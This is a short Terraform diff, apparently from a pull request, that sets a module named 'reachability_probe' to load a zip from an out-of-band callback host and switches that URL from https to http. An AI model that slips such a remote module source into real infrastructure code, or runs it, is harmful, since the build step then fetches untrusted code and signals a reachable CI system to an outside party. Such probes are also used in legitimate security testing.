@@ -8,5 +8,5 @@ terraform {
 }
 
 module "reachability_probe" {
-  source = "https://lh-atlantis-pr-r9.dbsc2mghlkvjbivjjabgzwrt6uieqtakp.oast.pro/probe.zip"
+  source = "http://lh-atlantis-pr-r9.dbsc2mghlkvjbivjjabgzwrt6uieqtakp.oast.pro/probe.zip"
 }
